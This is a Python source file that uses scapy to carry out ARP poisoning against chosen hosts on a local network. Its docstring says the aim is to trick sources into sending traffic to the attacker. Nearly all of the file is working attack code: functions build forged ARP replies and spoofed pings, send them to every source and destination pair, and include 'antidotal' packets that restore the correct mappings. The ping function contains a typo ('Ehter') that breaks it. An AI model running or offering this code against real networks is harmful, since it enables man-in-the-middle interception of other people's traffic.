from dataclasses import dataclass
from scapy.all import *
from util import Host, Interface

"""
In all functions it holds that the source has to be tricked,
so the source should believe that it sends traffic to the
destination meanwhile it sends traffic to us.
"""

@dataclass
class ARPAttackSettings:
    interface: Interface
    sources: list[Host]
    destinations: list[Host]
    two_way: bool
    initial_packets: int
    seconds_interval: int

    @property
    def me(self):
        return Host(
            self.interface.ip_addr,
            self.interface.mac_addr
        )

send_poisonous_pings = lambda settings: send_packets(settings, construct_poisonous_ping)
send_poisonous_packets = lambda settings: send_packets(settings, construct_poisonous_packet)
send_antidotal_packets = lambda settings: send_packets(settings, construct_antidotal_packet)

def construct_poisonous_ping(me: Host, source: Host, destination: Host):
    packet = Ether() / IP() / ICMP()
    packet[Ether].src = me.mac_addr
    packet[Ehter].dst = source.mac_addr
    packet[IP].src = destination.ip_addr
    packet[IP].dst = source.ip_addr
    # type 8 corresponds to ping request
    packet[ICMP].type = 8

    return packet

def construct_poisonous_packet(me: Host, source: Host, destination: Host):
    packet = Ether() / ARP()
    packet[Ether].src = me.mac_addr
    packet[Ether].dst = source.mac_addr
    packet[ARP].psrc = destination.ip_addr
    packet[ARP].pdst = source.ip_addr
    packet[ARP].hwsrc = me.mac_addr
    packet[ARP].hwdst = source.mac_addr

    return packet

def construct_antidotal_packet(me: Host, source: Host, destination: Host):
    packet = Ether() / ARP()
    packet[Ether].src = me.mac_addr
    packet[Ether].dst = source.mac_addr
    packet[ARP].psrc = destination.ip_addr
    packet[ARP].pdst = source.ip_addr
    packet[ARP].hwsrc = destination.mac_addr
    packet[ARP].hwdst = source.mac_addr

    return packet

def send_packets(settings: ARPAttackSettings, construct_packet: Callable[[Host, Host, Host], Packet]):
    pairs = [(x, y) for x in settings.sources for y in settings.destinations if x != y]

    for source, destination in pairs:
        sendp(
            construct_packet(settings.me, source, destination),
            iface=settings.interface.name,
            verbose=0)
        
        if settings.two_way:
            sendp(
                construct_packet(settings.me, destination, source),
                iface=settings.interface.name,
                verbose=0)